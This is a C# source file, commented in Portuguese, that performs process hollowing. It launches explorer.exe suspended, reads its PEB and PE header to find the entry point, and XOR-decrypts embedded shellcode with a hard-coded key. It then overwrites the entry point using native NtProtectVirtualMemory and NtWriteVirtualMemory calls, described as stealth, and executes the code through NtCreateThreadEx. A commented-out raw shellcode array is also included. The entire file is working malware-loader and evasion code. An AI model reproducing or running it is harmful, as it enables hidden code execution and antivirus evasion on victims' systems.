using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Hollow
{
    internal class Program
    {
        // --- ESTRUTURAS ---
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
            public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize;
            public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute;
            public uint dwFlags; public ushort wShowWindow; public ushort cbReserved2;
            public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus; public IntPtr PebBaseAddress; public IntPtr AffinityMask;
            public IntPtr BasePriority; public UIntPtr UniqueProcessId; public IntPtr InheritedFromUniqueProcessId;
        }

        // --- APIS NATIVAS ---
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpAppName, string lpCmdLine, IntPtr lpProcAttr, IntPtr lpThreadAttr, bool bInherit, uint dwFlags, IntPtr lpEnv, string lpDir, [In] ref STARTUPINFO lpSi, out PROCESS_INFORMATION lpPi);

        [DllImport("ntdll.dll")]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInfoClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint tmp);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("ntdll.dll")]
        public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll")]
        public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, ref uint NumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll")]
        public static extern uint NtCreateThreadEx(
            out IntPtr threadHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            uint stackZeroBits,
            uint sizeOfStack,
            uint sizeOfMaximumStack,
            IntPtr attributeList);

        // --- AUXILIARES ---
        public static byte[] DecryptXOR(byte[] data, byte[] key)
        {
            byte[] decrypted = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) decrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
            return decrypted;
        }

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // 1. Criar processo suspenso
            CreateProcess(null, "C:\\Windows\\explorer.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            // 2. Localizar ImageBase no PEB
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            ZwQueryInformationProcess(pi.hProcess, 0, ref bi, (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(pi.hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // 3. Achar EntryPoint no Header PE
            byte[] data = new byte[0x200];
            ReadProcessMemory(pi.hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            uint entryPointRVA = BitConverter.ToUInt32(data, (int)e_lfanew + 0x28);
            IntPtr entryPointAddr = (IntPtr)(entryPointRVA + (Int64)svchostBase);

            // 4. Preparar Shellcode (XOR)
            byte[] encryptedData = HollowSyscal.Properties.Resources.shellcode_enc;
            byte[] key = Encoding.ASCII.GetBytes("HFDG*febMXL@uX8YkkPhJof*");
            byte[] buf = DecryptXOR(encryptedData, key);
            Console.WriteLine("[*] DEBUG: Tamanho do shellcode: " + buf.Length);
            Console.WriteLine("[*] DEBUG: Primeiros 4 bytes decifrados: {0:X2} {1:X2} {2:X2} {3:X2}",
                              buf[0], buf[1], buf[2], buf[3]);

            //byte[] buf = HollowSyscal.Properties.Resources.shellcode;
            //byte[] buf = new byte[295] {0xfc,0x48,0x81,0xe4,0xf0,0xff,
            //    0xff,0xff,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            //    0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,
            //    0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x48,
            //    0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,
            //    0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,
            //    0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
            //    0x66,0x81,0x78,0x18,0x0b,0x02,0x41,0x51,0x0f,0x85,0x72,0x00,
            //    0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,
            //    0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,
            //    0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,
            //    0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
            //    0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            //    0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,
            //    0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,
            //    0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,
            //    0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
            //    0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            //    0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,
            //    0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,
            //    0x59,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,
            //    0x00,0x00,0x00,0x00,0xe8,0x05,0x00,0x00,0x00,0x4f,0x53,0x45,
            //    0x50,0x00,0x5a,0xe8,0x05,0x00,0x00,0x00,0x4f,0x53,0x45,0x50,
            //    0x00,0x41,0x58,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,
            //    0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,
            //    0xd5};


            // 5. Mudar Proteção para RW, Escrever e Voltar para RX (Furtividade)
            IntPtr baseAddrToProtect = entryPointAddr;
            IntPtr sizeToProtect = (IntPtr)buf.Length;
            uint oldProtect = 0;
            uint bytesWritten = 0;

            // PAGE_READWRITE (0x04)
            NtProtectVirtualMemory(pi.hProcess, ref baseAddrToProtect, ref sizeToProtect, 0x04, out oldProtect);

            // Escrita via Syscall Nativa
            uint ntStatus = NtWriteVirtualMemory(pi.hProcess, entryPointAddr, buf, (uint)buf.Length, ref bytesWritten);

            if (ntStatus == 0) Console.WriteLine("[+] Escrita via NtWriteVirtualMemory concluída.");

            // Restaurar proteção original (Geralmente RX)
            uint tempProtect = 0;
            NtProtectVirtualMemory(pi.hProcess, ref baseAddrToProtect, ref sizeToProtect, oldProtect, out tempProtect);

            // 1. Verifique se o NtWriteVirtualMemory realmente escreveu todos os bytes
            if (bytesWritten != (uint)buf.Length)
            {
                Console.WriteLine("[!] Erro: Shellcode incompleto na memória remota!");
            }

            // 2. Tente ler de volta o que você escreveu para confirmar
            byte[] verifyBuf = new byte[buf.Length];
            ReadProcessMemory(pi.hProcess, entryPointAddr, verifyBuf, verifyBuf.Length, out nRead);

            if (Convert.ToBase64String(buf) == Convert.ToBase64String(verifyBuf))
            {
                Console.WriteLine("[+] Sucesso: Memória remota conferida e idêntica ao shellcode.");
            }
            else
            {
                Console.WriteLine("[!] Erro: A memória no processo alvo não condiz com o shellcode!");
            }

            IntPtr hRemoteThread = IntPtr.Zero;
            // 0x1FFFFF garante acesso total ao thread criado
            uint ntStatusThread = NtCreateThreadEx(
                out hRemoteThread,
                0x1FFFFF,
                IntPtr.Zero,
                pi.hProcess,
                entryPointAddr,
                IntPtr.Zero,
                false, // false = inicia imediatamente
                0, 0, 0, IntPtr.Zero);

            if (ntStatusThread == 0)
            {
                Console.WriteLine("[+] Shellcode disparado em nova thread via NtCreateThreadEx!");
            }

            // 6. Executar
            // ResumeThread(pi.hThread);
            Console.WriteLine("[*] Aguardando conexão... (Thread original suspensa)");

            // Mantenha o programa aberto para a thread remota não morrer junto
            System.Threading.Thread.Sleep(-1);

            Console.WriteLine("[*] Processo retomado.");
        }
    }
}